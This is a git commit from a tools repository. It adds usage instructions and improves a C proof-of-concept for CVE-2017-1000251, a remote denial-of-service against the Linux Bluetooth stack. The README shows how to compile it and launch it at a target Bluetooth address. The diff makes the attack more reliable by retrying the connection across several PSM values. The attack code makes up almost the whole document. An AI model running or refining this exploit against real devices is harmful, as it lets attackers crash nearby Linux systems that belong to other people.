marsyy__littl_tools
commit 7fcc6cf0e87c726eebe0d5ef97a1602698bfa428
Author:     daiyang <406555789@qq.com>
AuthorDate: Fri Sep 22 04:05:28 2017 -0400
Commit:     daiyang <406555789@qq.com>
CommitDate: Fri Sep 22 04:05:28 2017 -0400

    Develop | Add poc for CVE-2017-1000251
    
    Signed-off-by: daiyang <406555789@qq.com>

diff --git a/bluetooth/CVE-2017-1000251/README b/bluetooth/CVE-2017-1000251/README
index e69de29..e9d45cc 100644
--- a/bluetooth/CVE-2017-1000251/README
+++ b/bluetooth/CVE-2017-1000251/README
@@ -0,0 +1,5 @@
+
+***Only for linux devices***
+usage:
+$ gcc -o test poc_remote_dos.c -lbluetooth
+$ sudo ./test TARGET_ADDR
diff --git a/bluetooth/CVE-2017-1000251/poc_remote_dos.c b/bluetooth/CVE-2017-1000251/poc_remote_dos.c
index aa12e8b..4cfff12 100644
--- a/bluetooth/CVE-2017-1000251/poc_remote_dos.c
+++ b/bluetooth/CVE-2017-1000251/poc_remote_dos.c
@@ -126,6 +126,8 @@ int main(int argc ,char* argv[]){
 	struct sockaddr_l2 local_l2_addr;
 	struct sockaddr_l2 remote_l2_addr;
 	struct fack_opt fack;
+	__le16 psm_default = 0x1001;
+	int retry_count = 0;
 
 	if(argc != 2){
 		printf("usage : sudo ./test TARGET_ADDR\n");
@@ -157,14 +159,21 @@ int main(int argc ,char* argv[]){
 
 	memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
 	remote_l2_addr.l2_family = PF_BLUETOOTH;
-	remote_l2_addr.l2_psm = htobs(0x1003);
+	remote_l2_addr.l2_psm = htobs(psm_default);
 	str2ba(dest, &remote_l2_addr.l2_bdaddr);
 
-
-	if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
-  		perror("[-]Can't connect");  
-		goto out;  
-	} 
+	while(retry_count < 5){
+		if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
+			perror("[-]Can't connect"); 
+			retry_count ++; 
+			remote_l2_addr.l2_psm = htobs(psm_default + retry_count);
+			continue;
+		}
+		else
+			break;
+	}
+	if(retry_count == 5)
+		goto out;
 
 	//send conn req
 	sleep(2);
